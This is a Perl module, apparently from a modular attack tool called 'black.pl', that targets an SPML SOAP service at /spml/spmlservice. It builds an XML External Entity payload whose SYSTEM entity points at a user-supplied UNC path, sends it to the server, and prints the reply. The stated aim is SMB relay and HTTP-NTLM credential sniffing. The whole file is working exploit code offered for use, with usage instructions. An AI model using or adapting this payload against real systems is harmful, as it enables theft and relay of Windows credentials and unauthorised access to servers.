#!/usr/bin/perl
# Module SMB relay SPML service  (XML DOCTYPE)

# CONFIG
######################
my $desc ="SPML service (/spml/spmlservice) SMB relay + HTTP-NTLM sniff (XML External Entities) \n\t Usage: black.pl .. .. -m id_module <path> \n\t UNC path like this: \\\\192.168.0.101\n"; 
our $funcName="spml_doctype_smbrelay_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub spml_doctype_smbrelay_Func()
{
	
	my $XML='<!DOCTYPE root [
	<!ENTITY foo SYSTEM "%PATH%">
	]>
<in>&foo;</in>
	';
	
	
	if ($ARGV[$m_arg_i+1]){
		$path=$ARGV[$m_arg_i+1];
		print $path." - path \n\n";
	} else {
		print "Error. Please, enter path name\n";
		exit;
	}

	
	$XML=~s/%PATH%/$path/s;
	
	#print "$XML\r\n";
	
	my @answers=send_soap($XML,1, '/spml/spmlservice');

	my $answer=join('', @answers);

	print "$answer\r\n";
	
	print "\n\n";

}